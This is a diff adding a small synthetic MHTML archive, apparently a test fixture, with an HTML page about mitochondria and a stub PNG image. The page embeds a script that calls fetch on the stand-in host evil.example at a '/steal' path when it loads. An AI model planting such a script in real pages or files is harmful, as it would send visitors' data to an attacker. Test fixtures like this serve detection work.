@@ -1,0 +1,23 @@
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="----=_Synthetic"
+
+------=_Synthetic
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: file:///C:/synthetic/Mitochondria.htm
+
+<!DOCTYPE html>
+<html><head><title>Mitochondria</title></head><body>
+<h1>Mitochondria</h1>
+<p>Crist=C3=A6 hold enzymes.</p>
+<script>fetch("https://evil.example/steal")</script>
+</body></html>
+
+------=_Synthetic
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: file:///C:/synthetic/image.png
+
+iVBORw0KGgo=
+
+------=_Synthetic--
